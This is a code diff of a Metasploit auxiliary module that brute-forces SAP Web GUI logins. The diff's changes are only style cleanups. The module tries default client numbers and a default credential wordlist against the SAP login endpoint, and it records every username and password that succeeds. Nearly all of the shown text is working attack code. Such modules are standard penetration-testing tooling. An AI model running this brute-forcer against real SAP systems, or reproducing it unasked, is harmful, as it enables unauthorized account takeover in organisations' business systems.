@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -17,7 +18,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -26,13 +26,13 @@ class MetasploitModule < Msf::Auxiliary
   def initialize
     super(
       'Name' => 'SAP Web GUI Login Brute Forcer',
-      'Description' => %q{
+      'Description' => %q(
         This module attempts to brute force SAP username and passwords through the SAP Web
         GUI service. Default clients can be	tested without needing to set a CLIENT. Common
         and default user/password combinations can be tested just setting the DEFAULT_CRED
         variable to true. The MSF_DATA_DIRECTORY/wordlists/sap_default.txt path store
         stores these default combinations.
-      },
+      ),
       'References' =>
         [
           [ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
@@ -49,16 +49,17 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RPORT(8000),
         OptString.new('TARGETURI', [true, 'URI', '/']),
         OptString.new('CLIENT', [false, 'Client can be single (066), comma seperated list (000,001,066) or range (000-999)', '000,001,066']),
-        OptBool.new('DEFAULT_CRED',[false, 'Check using the default password and username',true]),
-        OptString.new('USERPASS_FILE',[false, '',nil])
-      ], self.class)
+        OptBool.new('DEFAULT_CRED', [false, 'Check using the default password and username', true]),
+        OptString.new('USERPASS_FILE', [false, '', nil])
+      ], self.class
+    )
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     uri = target_uri.to_s
     if datastore['CLIENT'].nil?
       print_status("Using default SAP client list")
-      client = ['000','001','066']
+      client = ['000', '001', '066']
     else
       client = []
       if datastore['CLIENT'] =~ /^\d{3},/
@@ -73,38 +74,32 @@ class MetasploitModule < Msf::Auxiliary
         print_status("Brute forcing client #{datastore['CLIENT']}")
       else
         print_status("Invalid CLIENT - using default SAP client list instead")
-        client = ['000','001','066']
+        client = ['000', '001', '066']
       end
     end
-    saptbl = Msf::Ui::Console::Table.new( Msf::Ui::Console::Table::Style::Default,
-      'Header'  => "[SAP] Credentials",
-      'Prefix'  => "\n",
-      'Postfix' => "\n",
-      'Indent'  => 1,
-      'Columns' => ["host","port","client","user","pass"])
-
+    saptbl = Msf::Ui::Console::Table.new(Msf::Ui::Console::Table::Style::Default,
+                                         'Header'  => "[SAP] Credentials",
+                                         'Prefix'  => "\n",
+                                         'Postfix' => "\n",
+                                         'Indent'  => 1,
+                                         'Columns' => ["host", "port", "client", "user", "pass"])
 
     if datastore['DEFAULT_CRED']
       credentials = extract_word_pair(Msf::Config.data_directory + '/wordlists/sap_default.txt')
       credentials.each do |u, p|
         client.each do |cli|
           success = bruteforce(uri, u, p, cli)
-          if success
-            saptbl << [ rhost, rport, cli, u, p]
-          end
+          saptbl << [ rhost, rport, cli, u, p] if success
         end
       end
     end
     each_user_pass do |u, p|
       client.each do |cli|
         success = bruteforce(uri, u, p, cli)
-        if success
-          saptbl << [ rhost, rport, cli, u, p]
-        end
+        saptbl << [ rhost, rport, cli, u, p] if success
       end
     end
     print(saptbl.to_s)
-
   end
 
   def report_cred(opts)
@@ -134,33 +129,31 @@ class MetasploitModule < Msf::Auxiliary
     create_credential_login(login_data)
   end
 
-  def bruteforce(uri,user,pass,cli)
+  def bruteforce(uri, user, pass, cli)
     begin
       path = "sap/bc/gui/sap/its/webgui/"
       cookie = "Active=true; sap-usercontext=sap-language=EN&sap-client=#{cli}"
-      res = send_request_cgi({
-        'uri'    => "#{uri}#{path}",
-        'method' => 'POST',
-        'cookie' => cookie,
-        'vars_post' => {
-          'sap-system-login-oninputprocessing' => 'onLogin',
-          'sap-urlscheme' => '',
-          'sap-system-login' => 'onLogin',
-          'sap-system-login-basic_auth' => '',
-          'sap-system-login-cookie_disabled' => '',
-          'sysid' => '',
-          'sap-client' => cli,
-          'sap-user' => user,
-          'sap-password' => pass,
-          'sap-language' => 'EN'
-          }
-        })
+      res = send_request_cgi('uri' => "#{uri}#{path}",
+                             'method' => 'POST',
+                             'cookie' => cookie,
+                             'vars_post' => {
+                               'sap-system-login-oninputprocessing' => 'onLogin',
+                               'sap-urlscheme' => '',
+                               'sap-system-login' => 'onLogin',
+                               'sap-system-login-basic_auth' => '',
+                               'sap-system-login-cookie_disabled' => '',
+                               'sysid' => '',
+                               'sap-client' => cli,
+                               'sap-user' => user,
+                               'sap-password' => pass,
+                               'sap-language' => 'EN'
+                             })
     rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
       print_error("[SAP] #{rhost}:#{rport} - Service failed to respond")
       return false
     end
 
-    if res and res.code == 302
+    if res && (res.code == 302)
       report_cred(
         ip: rhost,
         port: rport,
@@ -170,7 +163,7 @@ class MetasploitModule < Msf::Auxiliary
         proof: "SAP Client: #{cli}"
       )
       return true
-    elsif res and res.code == 200
+    elsif res && (res.code == 200)
       if res.body =~ /log on again/
         return false
       elsif res.body =~ /<title>Change Password - SAP Web Application Server<\/title>/
